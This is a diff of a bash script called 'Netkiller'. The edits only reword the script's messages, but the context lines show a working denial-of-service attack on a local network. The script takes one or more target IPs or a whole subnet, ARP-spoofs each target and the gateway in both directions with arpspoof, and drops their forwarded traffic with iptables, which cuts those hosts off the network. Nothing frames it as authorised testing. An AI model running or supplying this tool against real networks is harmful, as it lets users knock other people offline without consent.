@@ -77,7 +77,7 @@ case $target_type in
         TARGETS=($TARGET)
         ;;
     2)
-        echo "Multiple Target User IP's: e.g 10.0.0.123,10.0.0.124"
+        echo "Multiple Target Users IP's: e.g 10.0.0.123,10.0.0.124"
         read -p "Enter Multiple Users IP's:  " target_input
         IFS=',' read -ra TARGETS <<< "$target_input"
         ;;
@@ -129,7 +129,7 @@ case $target_type in
 
         # Option to exempt additional IPs
         echo ""
-        read -p "Do you want to exempt any additional IP's from the subnet? (y/n) " exempt_choice
+        read -p "Do you want to exempt any additional IP's from the subnet attack? (y/n) " exempt_choice
         if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
             echo ""
             echo "Enter IP's to exempt: e.g 10.0.0.110,10.0.0.120"
@@ -165,7 +165,7 @@ if [ ${#TARGETS[@]} -eq 0 ]; then
 fi
 
 # Confirm before proceeding
-echo -e "\nNumber of targets IP's to affect: ${#TARGETS[@]}"
+echo -e "\nNumber of target IP's affected: ${#TARGETS[@]}"
 echo ""
 read -p "Are you sure you want to continue? (y/n) " confirm
 if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
@@ -177,7 +177,7 @@ fi
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
     echo ""
-    echo "Netkiller killing the connection for $TARGET"
+    echo "Netkiller kill the connection of $TARGET"
     arpspoof -i $INTERFACE -t $TARGET $GATEWAY >/dev/null 2>&1 &
     PIDS+=($!)
     arpspoof -i $INTERFACE -t $GATEWAY $TARGET >/dev/null 2>&1 &
@@ -192,7 +192,7 @@ done
 
 # Function to clean up
 cleanup() {
-    echo -e "\nCleaning up ruleset..."
+    echo -e "\nCleaning up..."
     # Kill all arpspoof processes
     for pid in "${PIDS[@]}"; do
         kill -9 $pid >/dev/null 2>&1
@@ -206,13 +206,13 @@ cleanup() {
         iptables -D FORWARD -d $TARGET -j DROP >/dev/null
     done
     echo ""
-    echo "Restoring the wifi clients connection..."
+    echo "Restoring the connection..."
 }
 
 # Trap Ctrl+C
 trap cleanup EXIT
 
-echo -e "\nNetkiller attack running. Press Ctrl+C to stop..."
+echo -e "\nNetkiller attack is running. Press Ctrl+C to stop..."
 while true; do
     sleep 1
 done
